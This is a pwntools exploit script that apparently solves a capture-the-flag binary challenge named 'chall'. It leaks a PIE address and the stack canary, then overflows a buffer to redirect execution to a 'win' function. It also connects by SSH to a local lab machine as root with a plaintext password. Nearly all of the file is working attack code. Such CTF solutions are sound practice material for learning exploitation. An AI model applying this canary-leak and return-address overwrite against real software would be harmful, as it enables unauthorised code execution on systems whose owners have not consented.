from pwn import *

HOST, PORT = "addr", 1234
cwd = "/root/workbench/PWN/pwn02"

exe = ELF("./chall",checksec=False)
context.binary = exe
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        sh = ssh(host="192.168.10.135", port=22, user="root", password="password")
        p = sh.process([f"{cwd}/chall"], cwd=cwd)
        gdb.attach(p)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    # === Alias === #
    p = conn()
    s = p.send
    sl = p.sendline
    sla = p.sendlineafter
    sa = p.sendafter
    r = p.recv
    ru = p.recvuntil
    rn = p.recvn
    rl = p.recvline
    # === Exploit === #
    ru(b"address: ")
    main_addr = int(rn(14), 16)
    pie_base = main_addr - 0x149a # main offset
    pie_base = main_addr - exe.sym.main
    main_offset = main_addr - pie_base
    win_addr = pie_base + exe.sym.win
    log.success(f"main addr: {hex(main_addr)}")
    log.success(f"base addr: {hex(pie_base)}")
    log.success(f"main offset: {hex(main_offset)}")
    log.success(f"win addr: {hex(win_addr)}")
    payload = b"A" * 0x29
    sa(b"probe> ", payload)
    ru(b"A"*0x29)
    canary = u64(b"\x00" + rn(7))
    log.success(f"canary: {hex(canary)}")
    payload = (b"A" * 0x28) + p64(canary) + (b"A" * 0x8) + p64(win_addr)
    log.success(f"len: {len(payload)}")
    log.success(f"final payload: {payload}")
    sa(b"payload> ", payload)
    pause()
    # =============== #
    p.interactive()

if __name__ == "__main__":
    main()